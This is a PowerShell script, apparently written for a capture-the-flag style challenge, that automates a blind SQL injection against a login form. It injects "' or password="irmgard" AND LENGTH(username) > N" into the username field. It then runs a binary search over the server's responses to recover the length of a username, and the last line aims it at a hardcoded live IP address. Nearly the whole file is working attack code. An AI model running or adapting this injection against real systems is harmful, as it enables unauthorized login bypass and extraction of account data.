
function encodeHTTP
{
param(
[Parameter(Position=0)]
[string]$toencode
)
    [Reflection.Assembly]::LoadWithPartialName("System.Web") | Out-Null
    $Encoded = [System.Web.HttpUtility]::UrlEncode($toencode)
    Write-Output $Encoded
}

function decodeHTTP
{
param(
[Parameter(Position=0)]
[string]$toDecode
)
    [Reflection.Assembly]::LoadWithPartialName("System.Web") | Out-Null
    $Decoded = [System.Web.HttpUtility]::UrlDecode($toDecode)
    write-Output $Decoded
}

# 
# Perform a binary search on a sorted data set
#   with the comparison logic separated out
#   into the script block $targetIsGreaterThan
# Returns the found value,
#   or the closest value in the range
#   if the target is outside of the range

function Search-Binary {
param(
    [Parameter(Mandatory)]
    [ValidateScript({ $_.Ast.ParamBlock.Parameters.Count -eq 1 })]
    [ScriptBlock] $targetIsGreaterThan,
    [int] $lower = 0,
    [int] $upper = 1000
)
    
    while($lower -lt $upper)
    {
        $middle = [Math]::Floor(($lower+$upper)/2)
        if(&$targetIsGreaterThan $middle) {
            $lower = $middle + 1
        } else {
            $upper = $middle
        }
    }
    return $lower
}



function test-sqlfieldlength{
param(
[string]$URI,
[string]$bodybefore,
[string]$bodyafter,
[string]$teststring
)

    $isLengthGreaterThanGuess = 
    {
    param($guess)
        $check=" > $guess "
        $check=encodeHTTP $check
        $body= -join ($bodybefore,$check,$bodyafter)
        $return=Invoke-WebRequest -Method Post -Uri $uri -Body $body -UseBasicParsing
        "$($return.content)" -notlike "*$($teststring)*"
    }

    $length = Search-Binary $isLengthGreaterThanGuess
    Write-Output $length

}

$before= encodeHTTP "' or password=""irmgard"" AND LENGTH(username)"
$before= "username=" + $before
test-sqlfieldlength -URI http://34.74.105.127/e1c6c18d54/login -bodybefore $before -bodyafter ";&password=" -teststring "Unknown user"